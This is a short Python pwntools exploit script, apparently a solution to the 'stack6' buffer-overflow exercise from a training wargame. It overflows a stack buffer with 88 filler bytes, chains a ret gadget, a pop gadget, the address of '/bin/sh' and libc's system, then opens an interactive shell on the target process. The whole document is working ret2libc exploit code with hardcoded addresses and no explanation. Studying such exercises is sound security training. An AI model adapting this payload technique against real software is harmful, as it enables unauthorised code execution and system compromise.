from pwn import *

sys = p64(0x7ffff7a31420)
bin_sh = p64(0x7ffff7b95d88)
offset = 88
pop = p64(0x00400713)
ret = p64(0x0040068a)

payload = 'A' * offset + ret + pop + bin_sh + sys

p = process('./stack6')
p.sendline(payload)
p.interactive()
